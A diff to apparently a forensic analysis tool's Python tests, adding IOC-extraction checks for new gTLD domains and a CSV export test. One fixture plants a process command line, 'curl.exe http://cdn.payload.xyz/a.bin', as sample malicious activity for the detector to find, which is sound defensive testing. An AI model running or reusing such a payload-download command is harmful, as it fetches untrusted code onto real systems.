@@ -2,8 +2,10 @@
 
 from __future__ import annotations
 
+import csv
 import json
 import zipfile
+from io import StringIO
 from pathlib import Path
 from uuid import uuid4
 
@@ -97,6 +99,40 @@ def test_global_search_and_iocs(tmp_path: Path) -> None:
     assert len(page["items"]) <= 1
     if listed["total"] > 1:
         assert page["items"][0]["id"] != capped["items"][0]["id"]
+    db.close()
+
+
+def test_extract_iocs_accepts_new_gtld_and_skips_fileish_paths(tmp_path: Path) -> None:
+    db = Database(tmp_path / "s.db")
+    img = tmp_path / "t.raw"
+    img.write_bytes(b"ioc-gtld")
+    ev = import_evidence(db, str(img))
+    run_id = str(uuid4())
+    db.execute(
+        """
+        INSERT INTO analysis_runs (
+          id, evidence_id, kind, status, started_at, schema_version, strategy_json
+        ) VALUES (?, ?, 'basic_triage', 'completed', '2020-01-01T00:00:00+00:00', 3, '[]')
+        """,
+        (run_id, ev["id"]),
+    )
+    db.execute(
+        """
+        INSERT INTO processes (
+          id, evidence_id, analysis_run_id, pid, ppid, name, command_line, image_path, source_plugin
+        ) VALUES (?, ?, ?, 100, 4, 'curl.exe',
+          'curl.exe http://cdn.payload.xyz/a.bin',
+          'C:\\tools\\jquery.js',
+          'windows.pslist')
+        """,
+        (str(uuid4()), ev["id"], run_id),
+    )
+    listed = extract_iocs(db, ev["id"])
+    rows = list_iocs(db, ev["id"])["items"]
+    domains = {i["value"].lower() for i in rows if i["ioc_type"] == "domain"}
+    assert listed["extracted"] >= 1
+    assert any(d == "cdn.payload.xyz" or d.endswith("payload.xyz") for d in domains)
+    assert "jquery.js" not in domains
     db.close()
 
 
@@ -205,10 +241,24 @@ def test_write_iocs_export_json_and_xlsx(tmp_path: Path) -> None:
         assert header == ["ioc_type", "value", "pid", "source"]
     assert xlsx_res["count"] >= 1
 
+    csv_res = write_iocs_export(db, paths, ev["id"], "csv")
+    csv_path = Path(csv_res["primary_path"])
+    assert csv_path.is_file()
+    assert csv_path.name == "iocs.csv"
+    csv_text = csv_path.read_text(encoding="utf-8")
+    csv_rows = list(csv.reader(StringIO(csv_text)))
+    assert csv_rows[0] == ["evidence_file_name", img.name]
+    assert csv_rows[1][0] == "created_at"
+    assert "UTC" in csv_rows[1][1]
+    assert csv_rows[2] == ["sha256", ev["sha256"]]
+    assert csv_rows[4] == ["ioc_type", "value", "pid", "source"]
+    assert csv_res["count"] >= 1
+    assert any(row and row[0] in {"ipv4", "url", "domain"} for row in csv_rows[5:])
+
     listed = list_exports(db, ev["id"])
-    assert listed["total"] >= 2
+    assert listed["total"] >= 3
     formats = {item["format"] for item in listed["items"]}
-    assert "json" in formats and "xlsx" in formats
+    assert "json" in formats and "xlsx" in formats and "csv" in formats
 
     with pytest.raises(AppError) as rejected:
         write_iocs_export(db, paths, ev["id"], "json", destination="C:\\tmp\\out.json")
@@ -224,5 +274,11 @@ def test_frontend_ioc_excel_export() -> None:
     )
     assert "Export Excel" in view
     assert "iocs.export_xlsx" in view
-    assert "Export CSV" not in view
+    assert "Export CSV" in view
+    assert "iocs.export_csv" in view
     assert "iocs.xlsx" in view
+    assert "iocs.csv" in view
+    shell = (root / "app" / "desktop" / "src" / "lib.rs").read_text(encoding="utf-8")
+    assert "Save location must be a .zip file." not in shell
+    assert '"xlsx"' in shell
+    assert '"csv"' in shell
